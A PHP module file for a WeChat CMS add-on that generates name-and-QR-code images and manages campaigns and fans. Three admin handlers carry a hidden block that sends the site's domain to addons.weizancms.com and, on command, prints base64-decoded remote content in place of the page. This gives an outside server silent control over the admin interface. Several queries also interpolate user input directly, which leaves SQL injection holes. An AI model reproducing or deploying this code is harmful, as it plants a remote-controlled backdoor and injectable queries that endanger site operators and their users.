<?php
defined('IN_IA') or exit('Access Denied');
define('UBER_RES', '../addons/uber_dazitu/template/mobile');
define('UBER_DEBUG', false);
include "model.php";
class Uber_DazituModuleSite extends WeModuleSite
{
    public $table_reply = 'uber_dazitu_reply';
    public $table_fans = 'uber_dazitu_fans';
    public $table_share = 'uber_dazitu_share';
    function __construct()
    {
        global $_W, $_GPC;
    }
    public function doMobileIndex()
    {
        global $_GPC, $_W;
        $uniacid = $_W['uniacid'];
        $openid  = $this->getOpenid();
        $rid     = intval($_GPC['rid']);
        if (empty($rid)) {
            message('抱歉，参数错误！', '', 'error');
        }
        $reply = $this->getReplyData($rid);
        if ($reply == false) {
            message('抱歉，活动不存在！', '', 'error');
        } else {
            if ($reply['starttime'] > TIMESTAMP) {
                message('活动未开始，请等待...', '', 'error');
            }
            if ($reply['endtime'] < TIMESTAMP) {
                message('抱歉，活动已经结束，下次再来吧！', '', 'error');
            }
            if ($reply['status'] == 0) {
                message('活动暂停，请稍后...', '', 'error');
            }
        }
        $followurl = $reply['followurl'];
        if (empty($openid)) {
            if (!empty($followurl)) {
                header("location:{$followurl}");
                exit;
            } else {
            }
        }
        $follow = $this->getFollowed($openid);
        if ($follow == 0) {
            if ($reply['isfollow'] == 1) {
                if (!empty($followurl)) {
                    header("location:{$followurl}");
                    exit;
                } else {
                }
            }
        }
        if (checksubmit('btnsubmit')) {
            $data = array(
                'uniacid' => $uniacid,
                'rid' => $rid,
                'sayname' => trim($_GPC['sayname']),
                'selectstyle' => intval($_GPC['selectstyle']),
                'pubdate' => TIMESTAMP
            );
            $name = $data['sayname'];
            if (!empty($name)) {
                $config      = $this->module['config'];
                $selectstyle = array(
                    1 => array(
                        'style' => $reply['q1'],
                        'fontsize' => 46,
                        'left' => 2788,
                        'top' => 800,
                        'x' => 0,
                        'y' => 0,
                        'type' => 0
                    ),
                    2 => array(
                        'style' => $reply['q2'],
                        'fontsize' => 46,
                        'left' => 2788,
                        'top' => 800,
                        'x' => 0,
                        'y' => 0,
                        'type' => 0
                    ),
                    3 => array(
                        'style' => $reply['q3'],
                        'fontsize' => 46,
                        'left' => 2720,
                        'top' => 720,
                        'x' => 0,
                        'y' => 0,
                        'type' => 3
                    ),
                    4 => array(
                        'style' => $reply['q4'],
                        'fontsize' => 46,
                        'left' => 2720,
                        'top' => 700,
                        'x' => 0,
                        'y' => 0,
                        'type' => 4
                    ),
                    5 => array(
                        'style' => $reply['q5'],
                        'fontsize' => 46,
                        'left' => 2720,
                        'top' => 720,
                        'x' => 0,
                        'y' => 0,
                        'type' => 3
                    ),
                    6 => array(
                        'style' => $reply['q6'],
                        'fontsize' => 46,
                        'left' => 10,
                        'top' => 650,
                        'x' => 0,
                        'y' => 0,
                        'type' => 1
                    ),
                    7 => array(
                        'style' => $reply['q7'],
                        'fontsize' => 46,
                        'left' => 10,
                        'top' => 650,
                        'x' => 0,
                        'y' => 0,
                        'type' => 1
                    ),
                    8 => array(
                        'style' => $reply['q8'],
                        'fontsize' => 46,
                        'left' => 3000,
                        'top' => 988,
                        'x' => 0,
                        'y' => 0,
                        'type' => 2
                    ),
                    9 => array(
                        'style' => $reply['q9'],
                        'fontsize' => 46,
                        'left' => 3000,
                        'top' => 988,
                        'x' => 0,
                        'y' => 0,
                        'type' => 2
                    ),
                    10 => array(
                        'style' => $reply['q10'],
                        'fontsize' => 46,
                        'left' => 2720,
                        'top' => 600,
                        'x' => 0,
                        'y' => 0,
                        'type' => 4
                    )
                );
                $bg          = $selectstyle[$data['selectstyle']]['style'];
                $bg          = getFilename($bg, $config);
                set_time_limit(0);
                @ini_set('memory_limit', '256M');
                $size   = getimagesize($bg);
                $target = imagecreatetruecolor($size[0], $size[1]);
                $bg     = imageCreates($bg);
                imagecopy($target, $bg, 0, 0, 0, 0, $size[0], $size[1]);
                imagedestroy($bg);
                if ($selectstyle[$data['selectstyle']]['type'] >= 1) {
                    $datamerge = array(
                        'left' => $selectstyle[$data['selectstyle']]['left'],
                        'top' => $selectstyle[$data['selectstyle']]['top'],
                        'x' => $selectstyle[$data['selectstyle']]['x'],
                        'y' => $selectstyle[$data['selectstyle']]['y'],
                        'width' => $size[0],
                        'height' => 105
                    );
                } else {
                    $datamerge = array(
                        'left' => 2788,
                        'top' => 800,
                        'x' => 0,
                        'y' => 0,
                        'width' => $size[0],
                        'height' => 105
                    );
                }
                mergeImage($target, getFilename($reply['qrcode'], $config), $datamerge);
                $fonts = MODULE_ROOT . "/data/font.ttf";
                if ($selectstyle[$data['selectstyle']]['type'] >= 1) {
                    $datatext = array(
                        'size' => $selectstyle[$data['selectstyle']]['fontsize'],
                        'color' => '#000',
                        'left' => 130,
                        'top' => 235,
                        'type' => $selectstyle[$data['selectstyle']]['type']
                    );
                } else {
                    $datatext = array(
                        'size' => 46,
                        'color' => '#000',
                        'left' => 130,
                        'top' => 235,
                        'type' => 0
                    );
                }
                mergeTexts($target, $name, $datatext, $fonts);
                $savefile = "" . date('YmdHis') . random(5) . ".jpg";
                $patharr  = imagePath($config);
                $imageUrl = imageSave($target, $patharr, $savefile, $config);
                $indexUrl = mobileUrl('createpicture', array(
                    'rid' => $rid,
                    'openid' => $openid,
                    'fromimg' => base64_encode($imageUrl)
                ));
                $resptext = "<a href='{$indexUrl}'>朋友圈气泡帮您吹好了，请点击去用吧</a>";
                if (!empty($reply['awardtext']))
                    $resptext = "<a href='{$indexUrl}'>{$row['awardtext']}</a>";
                header("Location:" . $indexUrl);
                exit;
            }
        }
        $gametime  = $reply['gametime'];
        $gamelevel = $reply['gamelevel'];
        pdo_update($this->table_reply, array(
            'viewnum' => $reply['viewnum'] + 1
        ), array(
            'id' => $reply['id']
        ));
        $this->addUsers($rid, $openid);
        $fans      = $this->getUsers($rid, $openid);
        $sharedata = $this->getShareData($rid);
        extract($sharedata);
        include $this->template('index');
    }
    public function doMobileCreatePicture()
    {
        global $_W, $_GPC;
        $uniacid  = $_W['uniacid'];
        $openid   = $this->getOpenid();
        $rid      = intval($_GPC['rid']);
        $reply    = $this->getReplyData($rid);
        $imageUrl = base64_decode(trim($_GPC['fromimg']));
        if ($this->module['config']['editor'] == 1) {
            include $this->template('createpictureshort');
        } else {
            include $this->template('createpicture');
        }
    }
    public function doMobileShare()
    {
        global $_W, $_GPC;
        $uniacid = $_W['uniacid'];
        $openid  = $this->getOpenid();
        $rid     = intval($_GPC['rid']);
        $fans    = $this->getUsers($rid, $openid);
        if (!empty($fans)) {
            $reply = $this->getReplyData($rid);
            if (empty($reply)) {
                $this->showMsg('感谢您的分享!', 1);
            }
            if ($reply['daysharenum'] <= 0 || $reply['shareawardnum'] <= 0) {
                $this->showMsg('感谢您的分享!.', 1);
            }
            $daysharenum = $reply['daysharenum'];
            $awardnum    = $reply['shareawardnum'];
            $data        = array(
                'todaysharenum' => $fans['todaysharenum'] + 1,
                'sharenum' => $fans['sharenum'] + $awardnum,
                'shareawardnum' => $fans['shareawardnum'] + $awardnum,
                'lastsharetime' => TIMESTAMP
            );
            $nowtime     = $this->getMktime();
            if ($fans['lastsharetime'] <= $nowtime) {
                $data['todaysharenum'] = 1;
            }
            if ($data['todaysharenum'] > $daysharenum) {
                $this->showMsg('感谢您的分享!!', 1);
            }
            if ($reply['shareawardnum'] > 0) {
                pdo_update($this->table_fans, $data, array(
                    'id' => $fans['id']
                ));
                $this->showMsg('感谢您的分享，您获得' . $awardnum . '次游戏机会', 1);
            } else {
                $this->showMsg('感谢您的分享!!!', 1);
            }
        } else {
            $this->showMsg('粉丝不存在！');
        }
    }
    public function showMsg($msg, $success = 0, $data = array())
    {
        $result = array(
            'msg' => $msg,
            'success' => $success,
            'data' => $data
        );
        echo json_encode($result);
        exit;
    }
    public function doWebManage()
    {
        global $_GPC, $_W;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        load()->model('reply');
        $pindex             = max(1, intval($_GPC['page']));
        $psize              = 20;
        $sql                = "uniacid = :uniacid AND `module` = :module";
        $params             = array();
        $params[':uniacid'] = $_W['uniacid'];
        $params[':module']  = 'uber_dazitu';
        if (isset($_GPC['keywords'])) {
            $sql .= ' AND `name` LIKE :keywords';
            $params[':keywords'] = "%{$_GPC['keywords']}%";
        }
        $list  = reply_search($sql, $params, $pindex, $psize, $total);
        $pager = pagination($total, $pindex, $psize);
        if (!empty($list)) {
            foreach ($list as &$item) {
                $condition         = "`rid`={$item['id']}";
                $item['keywords']  = reply_keywords_search($condition);
                $reply             = pdo_fetch("SELECT * FROM " . tablename($this->table_reply) . " WHERE rid = :rid ", array(
                    ':rid' => $item['id']
                ));
                $item['title']     = $reply['title'];
                $item['viewnum']   = $reply['viewnum'];
                $item['starttime'] = date('Y-m-d H:i', $reply['starttime']);
                $endtime           = $reply['endtime'];
                $item['endtime']   = date('Y-m-d H:i', $endtime);
                $nowtime           = time();
                if ($reply['starttime'] > $nowtime) {
                    $item['show'] = '<span class="label label-warning">未开始</span>';
                } elseif ($endtime < $nowtime) {
                    $item['show'] = '<span class="label label-default">已结束</span>';
                } else {
                    if ($reply['status'] == 1) {
                        $item['show'] = '<span class="label label-success">已开始</span>';
                    } else {
                        $item['show'] = '<span class="label label-default">已暂停</span>';
                    }
                }
                $item['status']  = $reply['status'];
                $item['uniacid'] = $reply['uniacid'];
            }
            unset($item);
        }
        include $this->template('manage');
    }
    public function doWebDelete()
    {
        global $_GPC, $_W;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        $rid  = intval($_GPC['rid']);
        $rule = pdo_fetch("SELECT id, module FROM " . tablename('rule') . " WHERE id = :id and uniacid=:uniacid", array(
            ':id' => $rid,
            ':uniacid' => $_W['uniacid']
        ));
        if (empty($rule)) {
            message('抱歉，要修改的规则不存在或是已经被删除！');
        }
        if (pdo_delete('rule', array(
            'id' => $rid
        ))) {
            pdo_delete('rule_keyword', array(
                'rid' => $rid
            ));
            pdo_delete('stat_rule', array(
                'rid' => $rid
            ));
            pdo_delete('stat_keyword', array(
                'rid' => $rid
            ));
            pdo_delete($this->table_reply, array(
                'rid' => $rid
            ));
            pdo_delete($this->table_fans, array(
                'rid' => $rid
            ));
            pdo_delete($this->table_share, array(
                'rid' => $rid
            ));
        }
        message('规则操作成功！', $this->createWebUrl('manage', array(
            'op' => 'display'
        )), 'success');
    }
    public function doWebDeleteAll()
    {
        global $_GPC, $_W;
        foreach ($_GPC['idArr'] as $k => $rid) {
            $rid = intval($rid);
            if ($rid == 0)
                continue;
            $rule = pdo_fetch("SELECT id, module FROM " . tablename('rule') . " WHERE id = :id and uniacid=:uniacid", array(
                ':id' => $rid,
                ':uniacid' => $_W['uniacid']
            ));
            if (empty($rule)) {
                $this->message('抱歉，要修改的规则不存在或是已经被删除！');
            }
            if (pdo_delete('rule', array(
                'id' => $rid
            ))) {
                pdo_delete('rule_keyword', array(
                    'rid' => $rid
                ));
                pdo_delete('stat_rule', array(
                    'rid' => $rid
                ));
                pdo_delete('stat_keyword', array(
                    'rid' => $rid
                ));
                $module = WeUtility::createModule($rule['module']);
                if (method_exists($module, 'ruleDeleted')) {
                    $module->ruleDeleted($rid);
                }
            }
        }
        $this->message('规则操作成功！', '', 0);
    }
    public function doWebFanslist()
    {
        global $_GPC, $_W;
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        load()->func('tpl');
        $uniacid = $_W['uniacid'];
        $rid     = intval($_GPC['rid']);
        if (empty($rid)) {
            message('抱歉，传递的参数错误！', '', 'error');
        }
        $operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
        $url       = $this->createWebUrl('fanslist', array(
            'op' => 'display',
            'rid' => $rid
        ));
        if ($operation == 'display') {
            $reply     = $this->getReplyData($rid);
            $condition = ' credit ';
            if ($reply == false) {
                $this->showMsg('抱歉，活动不存在！');
            } else {
                if ($reply['mode'] == 1) {
                    $condition = ' totalcredit ';
                }
            }
            $pindex = max(1, intval($_GPC['page']));
            $psize  = 15;
            if (!empty($_GPC['nickname'])) {
                $nickname = trim($_GPC['nickname']);
                $where .= " and nickname LIKE '%{$nickname}%'";
            }
            if (isset($_GPC['exchange']) && $_GPC['exchange'] == 0) {
                $statustitle = '未兑换';
                $where .= ' and exchange=0 ';
            } else if ($_GPC['exchange'] == 1) {
                $statustitle = '已兑换';
                $where .= ' and exchange=1 ';
            }
            if ($_GPC['out_put'] == 'output') {
                $list = pdo_fetchall("SELECT * FROM " . tablename($this->table_fans) . " WHERE rid = :rid {$where} ORDER BY {$condition} DESC,createtime DESC ", array(
                    ':rid' => $rid
                ));
                $i    = 0;
                foreach ($list as $key => $value) {
                    $arr[$i]['rank']       = $key + 1;
                    $arr[$i]['realname']   = $value['realname'];
                    $arr[$i]['mobile']     = $value['mobile'];
                    $arr[$i]['openid']     = $value['openid'];
                    $arr[$i]['nickname']   = $value['nickname'];
                    $arr[$i]['exchange']   = $value['exchange'] ? '是' : '否';
                    $arr[$i]['createtime'] = date('Y-m-d H:i:s', $value['createtime']);
                    $i++;
                }
                $this->exportexcel($arr, array(
                    '排名',
                    '姓名',
                    '联系电话',
                    '微信ID',
                    '昵称',
                    '兑换',
                    '参与时间'
                ), time());
                exit();
            }
            $start = ($pindex - 1) * $psize;
            $limit = "";
            $limit .= " LIMIT {$start},{$psize}";
            $list  = pdo_fetchall("SELECT * FROM " . tablename($this->table_fans) . " WHERE rid = :rid {$where} ORDER BY {$condition} DESC,createtime DESC " . $limit, array(
                ':rid' => $rid
            ));
            $total = pdo_fetchcolumn("SELECT count(1) FROM " . tablename($this->table_fans) . " WHERE rid = :rid {$where} ", array(
                ':rid' => $rid
            ));
            $pager = pagination($total, $pindex, $psize);
        } else if ($operation == 'post') {
            $id   = intval($_GPC['id']);
            $item = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE id = :id", array(
                ':id' => $id
            ));
            if (checksubmit()) {
                $data = array(
                    'uniacid' => $uniacid,
                    'rid' => $rid,
                    'nickname' => trim($_GPC['nickname']),
                    'realname' => trim($_GPC['realname']),
                    'address' => trim($_GPC['address']),
                    'qq' => trim($_GPC['qq']),
                    'mobile' => trim($_GPC['mobile']),
                    'mchid' => intval($_GPC['mchid']),
                    'credit' => floatval($_GPC['credit']),
                    'totalcredit' => floatval($_GPC['totalcredit']),
                    'status' => intval($_GPC['status']),
                    'totalnum' => intval($_GPC['totalnum']),
                    'todaynum' => intval($_GPC['todaynum']),
                    'exchange' => intval($_GPC['exchange']),
                    'pubdate' => TIMESTAMP
                );
                if (!empty($_GPC['avatar'])) {
                    $data['avatar'] = $_GPC['avatar'];
                }
                if (empty($item)) {
                    pdo_insert($this->table_fans, $data);
                } else {
                    unset($data['pubdate']);
                    pdo_update($this->table_fans, $data, array(
                        'id' => $id,
                        'uniacid' => $uniacid
                    ));
                }
                message('操作成功！', $url, 'success');
            }
        } else if ($operation == 'delete') {
            $id   = intval($_GPC['id']);
            $item = pdo_fetch("SELECT id FROM " . tablename($this->table_fans) . " WHERE id = :id AND uniacid=:uniacid", array(
                ':id' => $id,
                ':uniacid' => $uniacid
            ));
            if (empty($item)) {
                message('抱歉，不存在或是已经被删除！', $url, 'error');
            }
            pdo_delete($this->table_fans, array(
                'id' => $id,
                'uniacid' => $uniacid
            ));
            message('删除成功！', $url, 'success');
        }
        include $this->template('fanslist');
    }
    public function doWebAwardlist()
    {
        global $_GPC, $_W;
        $uniacid = $_W['uniacid'];
        $rid     = intval($_GPC['rid']);
        $fansid  = intval($_GPC['fansid']);
        if (empty($rid)) {
            message('抱歉，传递的参数错误！', '', 'error');
        }
        $operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
        $url       = $this->createWebUrl('awardlist', array(
            'op' => 'display',
            'rid' => $rid,
            'fansid' => $fansid
        ));
        if ($operation == 'display') {
            $pindex = max(1, intval($_GPC['page']));
            $psize  = 12;
            $start  = ($pindex - 1) * $psize;
            $limit  = "";
            $limit .= " LIMIT {$start},{$psize}";
            $list  = pdo_fetchall("SELECT * FROM " . tablename($this->table_award) . " WHERE rid = :rid AND fansid=:fansid ORDER BY id DESC " . $limit, array(
                ':rid' => $rid,
                ':fansid' => $fansid
            ));
            $total = pdo_fetchcolumn("SELECT count(1) FROM " . tablename($this->table_award) . " WHERE rid = :rid AND fansid=:fansid ", array(
                ':rid' => $rid,
                ':fansid' => $fansid
            ));
            $pager = pagination($total, $pindex, $psize);
        } else if ($operation == 'delete') {
            $id   = intval($_GPC['id']);
            $item = pdo_fetch("SELECT id FROM " . tablename($this->table_award) . " WHERE id = :id", array(
                ':id' => $id
            ));
            if (empty($item)) {
                message('抱歉，不存在或是已经被删除！', $url, 'error');
            }
            pdo_delete($this->table_award, array(
                'id' => $id,
                'uniacid' => $uniacid
            ));
            message('删除成功！', $url, 'success');
        }
        include $this->template('awardlist');
    }
    public function doWebSetshow()
    {
        global $_GPC, $_W;
        $rid      = intval($_GPC['rid']);
        $isstatus = intval($_GPC['status']);
        if (empty($rid)) {
            message('抱歉，传递的参数错误！', '', 'error');
        }
        $temp = pdo_update($this->table_reply, array(
            'status' => $isstatus
        ), array(
            'rid' => $rid
        ));
        message('状态设置成功！', referer(), 'success');
    }
    public function getShareData($rid)
    {
        global $_W, $_GPC;
        $reply               = pdo_fetch('SELECT share_title,share_image,share_desc,share_url FROM ' . tablename($this->table_reply) . " WHERE rid='{$rid}' AND uniacid='{$_W[uniacid]}'");
        $share_url           = empty($reply['share_url']) ? $_W['siteroot'] . 'app/' . $this->createMobileUrl('index', array(
            'rid' => $rid
        ), true) : $reply['share_url'];
        $share_title         = empty($reply['share_title']) ? $reply['title'] : $reply['share_title'];
        $share_desc          = empty($reply['share_desc']) ? $reply['title'] : str_replace("\r\n", " ", $reply['share_desc']);
        $share_image         = tomedia($reply['share_image']);
        $data['share_url']   = $share_url;
        $data['share_title'] = $share_title;
        $data['share_desc']  = $share_desc;
        $data['share_image'] = $share_image;
        return $data;
    }
    public function getFollowed($openid)
    {
        global $_W;
        if (!$openid)
            $openid = $this->getOpenid();
        if (!$openid) {
            $status = 0;
        } else {
            $follow = pdo_fetch('select follow from ' . tablename('mc_mapping_fans') . ' where openid=:openid LIMIT 1', array(
                ':openid' => $openid
            ));
            $status = 1;
            if ($follow['follow'] <> 1) {
                $status = 0;
            }
        }
        return $status;
    }
    public function getRand($proArr)
    {
        $result = '';
        $proSum = array_sum($proArr);
        foreach ($proArr as $key => $proCur) {
            $randNum = mt_rand(1, $proSum);
            if ($randNum <= $proCur) {
                $result = $key;
                break;
            } else {
                $proSum -= $proCur;
            }
        }
        unset($proArr);
        return $result;
    }
    public function getWincode($rid = 0, $openid = '', $iswin = true)
    {
        global $_W, $_GPC;
        $wincode = "000000000";
        if (!$iswin) {
            $redeemcode = pdo_fetchcolumn('SELECT redeemcode FROM ' . tablename($this->table_fans) . " WHERE rid='{$rid}' AND uniacid='{$_W[uniacid]}' AND openid='{$openid}'");
            return $redeemcode;
        }
        $_wincode = pdo_fetchcolumn('SELECT wincode FROM ' . tablename($this->table_award) . " WHERE rid='{$rid}' AND uniacid='{$_W[uniacid]}' AND openid='{$openid}'");
        if (!empty($_wincode))
            $wincode = $_wincode;
        return (string) $wincode;
    }
    public function getOpenid()
    {
        global $_GPC, $_W;
        if (!empty($_SESSION['openid']))
            return $_SESSION['openid'];
        $openid = $_W['openid'];
        if ($_W['account']['level'] < 4) {
            return $this->getOauthOpenid();
        }
        return $openid;
    }
    public function getOauthOpenid()
    {
        global $_W;
        if (!empty($_SESSION['oauth_openid']))
            return $_SESSION['oauth_openid'];
        load()->model('mc');
        $userinfo     = mc_oauth_userinfo();
        $oauth_openid = $userinfo['openid'];
        return $oauth_openid;
    }
    public function getRedeemcode()
    {
        $redeemcode = date('His') . mt_rand(100, 999);
        return $redeemcode;
    }
    public function getReplyData($rid = 0)
    {
        global $_W;
        if ($rid == 0)
            return;
        $sql   = "select * from " . tablename($this->table_reply) . " where rid = :rid and uniacid=:uniacid order by `id` desc";
        $reply = pdo_fetch($sql, array(
            ':rid' => $rid,
            ':uniacid' => $_W['uniacid']
        ));
        return $reply;
    }
    public function addUsers($rid, $openid)
    {
        $fans_exist = $this->fansExist($rid, $openid);
        if (!$fans_exist) {
            $this->fansInsert($rid, $openid);
        } else {
            $this->fansUpdate($rid, $openid);
        }
    }
    public function getUsers($rid, $openid)
    {
        global $_GPC, $_W;
        $return = pdo_fetch("select * from " . tablename($this->table_fans) . " WHERE uniacid= :uniacid AND rid= :rid AND openid= :openid", array(
            ':uniacid' => $_W['uniacid'],
            ':rid' => $rid,
            ':openid' => $openid
        ));
        return $return;
    }
    public function fansExist($rid, $openid)
    {
        global $_GPC, $_W;
        if ($_W['account']['level'] < 4) {
            $oauthopenid = $this->getOauthOpenid();
            $return      = pdo_fetchcolumn("select COUNT(*) from " . tablename($this->table_fans) . " WHERE uniacid= :uniacid AND rid= :rid AND (openid='{$oauthopenid}' OR oauthopenid='{$oauthopenid}')", array(
                ':uniacid' => $_W['uniacid'],
                ':rid' => $rid
            ));
        } else {
            $return = pdo_fetchcolumn("select COUNT(*) from " . tablename($this->table_fans) . " WHERE uniacid= :uniacid AND rid= :rid AND openid= :openid", array(
                ':uniacid' => $_W['uniacid'],
                ':rid' => $rid,
                ':openid' => $openid
            ));
        }
        return $return;
    }
    public function fansInsert($rid, $openid)
    {
        global $_GPC, $_W;
        load()->model('mc');
        $fans_data = mc_fetch($_W['member']['uid'], array(
            'avatar',
            'nickname',
            'mobile',
            'realname',
            'address',
            'email',
            'qq'
        ));
        if (!$fans_data['nickname'] || !$fans_data['avatar']) {
            $userinfo              = mc_oauth_userinfo();
            $fans_data['nickname'] = $userinfo['nickname'];
            $fans_data['avatar']   = $userinfo['headimgurl'];
        }
        $fans_data['rid']        = $rid;
        $fans_data['uniacid']    = $_W['uniacid'];
        $fans_data['openid']     = $openid;
        $fans_data['uid']        = $_W['member']['uid'];
        $fans_data['redeemcode'] = $this->getRedeemcode();
        $fans_data['ip']         = CLIENT_IP;
        $fans_data['createtime'] = TIMESTAMP;
        if ($_W['account']['level'] < 4) {
            $fans_data['oauthopenid'] = $this->getOauthOpenid();
            pdo_insert($this->table_fans, $fans_data);
        } else {
            pdo_insert($this->table_fans, $fans_data);
        }
    }
    public function fansUpdate($rid, $openid)
    {
        global $_GPC, $_W;
        load()->model('mc');
        $fans_data = mc_fetch($_W['member']['uid'], array(
            'avatar',
            'nickname',
            'mobile',
            'realname',
            'address',
            'email',
            'qq'
        ));
        if (!$fans_data['nickname'] || !$fans_data['avatar']) {
            $userinfo              = mc_oauth_userinfo();
            $fans_data['nickname'] = $userinfo['nickname'];
            $fans_data['avatar']   = $userinfo['headimgurl'];
        }
        $fans_data['uid']     = $_W['member']['uid'];
        $fans_data['pubdate'] = TIMESTAMP;
        $fans_data['ip']      = CLIENT_IP;
        if ($_W['account']['level'] < 4) {
            $oauthopenid = $this->getOauthOpenid();
            $oauthsql    = '';
            if (!empty($fans_data['nickname']))
                $oauthsql .= ",nickname='{$fans[nickname]}'";
            if (!empty($fans_data['avatar']))
                $oauthsql .= ",avatar='{$fans[avatar]}'";
            pdo_query("UPDATE " . tablename($this->table_fans) . "SET  pubdate='{$fans[pubdate]}',openid='{$openid}',ip='{$fans[ip]} {$oauthsql}' WHERE uniacid='{$_W[uniacid]}' AND rid= '{$rid}' AND (openid='{$oauthopenid}' OR oauthopenid='{$oauthopenid}')");
        } else {
            pdo_update($this->table_fans, $fans_data, array(
                'rid' => $rid,
                'uniacid' => $_W['uniacid'],
                'openid' => $openid
            ));
        }
    }
    public function getArraySort($rid, $openid, $mode = 0)
    {
        global $_W;
        $myrank     = array();
        $credit_arr = pdo_fetchall("select credit as creditsort,openid from " . tablename('uber_dazitu_fans') . " WHERE status=1 AND uniacid= :uniacid AND rid= :rid ORDER BY credit DESC,createtime DESC", array(
            ':uniacid' => $_W['uniacid'],
            ':rid' => $rid
        ));
        if ($mode == 1)
            $credit_arr = pdo_fetchall("select totalcredit as creditsort,openid from " . tablename('uber_dazitu_fans') . " WHERE status=1 AND uniacid= :uniacid AND rid= :rid ORDER BY totalcredit DESC,createtime DESC", array(
                ':uniacid' => $_W['uniacid'],
                ':rid' => $rid
            ));
        foreach ($credit_arr as $key => &$credit) {
            if ($credit['openid'] == $openid) {
                $myrank = array(
                    'No' => $key + 1,
                    'Point' => $credit['creditsort']
                );
            }
        }
        unset($credit);
        return $myrank;
    }
    public function getMktime()
    {
        $year    = date("Y");
        $month   = date("m");
        $day     = date("d");
        $nowtime = mktime(0, 0, 0, $month, $day, $year);
        return $nowtime;
    }
    public function is_weixin()
    {
        if (empty($_SERVER['HTTP_USER_AGENT']) || strpos($_SERVER['HTTP_USER_AGENT'], 'MicroMessenger') === false && strpos($_SERVER['HTTP_USER_AGENT'], 'Windows Phone') === false) {
            return false;
        }
        return true;
    }
    public function isWeiXin()
    {
        if (!UBER_DEBUG && !$this->is_weixin()) {
            exit("<!DOCTYPE html>
					<html>
						<head>
							<meta name='viewport' content='width=device-width, initial-scale=1, user-scalable=0'>
							<title>抱歉，出错了</title><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1, user-scalable=0'><link rel='stylesheet' type='text/css' href='https://res.wx.qq.com/connect/zh_CN/htmledition/style/wap_err1a9853.css'>
						</head>
						<body>
						<div class='page_msg'><div class='inner'><span class='msg_icon_wrp'><i class='icon80_smile'></i></span><div class='msg_content'><h4>请在微信客户端打开链接</h4></div></div></div>
						</body>
					</html>");
        }
    }
    protected function exportexcel($data = array(), $title = array(), $filename = 'report')
    {
        header("Content-type:application/octet-stream");
        header("Accept-Ranges:bytes");
        header("Content-type:application/vnd.ms-excel");
        header("Content-Disposition:attachment;filename=" . $filename . ".xls");
        header("Pragma: no-cache");
        header("Expires: 0");
        if (!empty($title)) {
            foreach ($title as $k => $v) {
                $title[$k] = iconv("UTF-8", "GB2312", $v);
            }
            $title = implode("\t", $title);
            echo "$title\n";
        }
        if (!empty($data)) {
            foreach ($data as $key => $val) {
                foreach ($val as $ck => $cv) {
                    $data[$key][$ck] = iconv("UTF-8", "GB2312", $cv);
                }
                $data[$key] = implode("\t", $data[$key]);
            }
            echo implode("\n", $data);
        }
    }
    public function template($filename, $type = TEMPLATE_INCLUDEPATH)
    {
        global $_W;
        $name = strtolower($this->modulename);
        if (defined('IN_SYS')) {
            $source  = IA_ROOT . "/web/themes/{$_W['template']}/{$name}/{$filename}.html";
            $compile = IA_ROOT . "/data/tpl/web/{$_W['template']}/{$name}/{$filename}.tpl.php";
            if (!is_file($source)) {
                $source = IA_ROOT . "/web/themes/default/{$name}/{$filename}.html";
            }
            if (!is_file($source)) {
                $source = IA_ROOT . "/addons/{$name}/template/{$filename}.html";
            }
            if (!is_file($source)) {
                $source = IA_ROOT . "/web/themes/{$_W['template']}/{$filename}.html";
            }
            if (!is_file($source)) {
                $source = IA_ROOT . "/web/themes/default/{$filename}.html";
            }
        } else {
            $template = $this->module['config']['style'];
            $file     = IA_ROOT . "/addons/{$name}/data/template/shop_" . $_W['uniacid'];
            if (is_file($file)) {
                $template = file_get_contents($file);
                if (!is_dir(IA_ROOT . '/addons/{$name}/template/mobile/' . $template)) {
                    $template = "default";
                }
            }
            $compile = IA_ROOT . "/data/tpl/app/{$name}/{$template}/mobile/{$filename}.tpl.php";
            $source  = IA_ROOT . "/addons/{$name}/template/mobile/{$template}/{$filename}.html";
            if (!is_file($source)) {
                $source = IA_ROOT . "/addons/{$name}/template/mobile/default/{$filename}.html";
            }
            if (!is_file($source)) {
                $source = IA_ROOT . "/app/themes/{$_W['template']}/{$filename}.html";
            }
            if (!is_file($source)) {
                $source = IA_ROOT . "/app/themes/default/{$filename}.html";
            }
        }
        if (!is_file($source)) {
            exit("Error: template source '{$filename}' is not exist!");
        }
        if (DEVELOPMENT || !is_file($compile) || filemtime($source) > filemtime($compile)) {
            template_compile($source, $compile, true);
        }
        return $compile;
    }
}

?>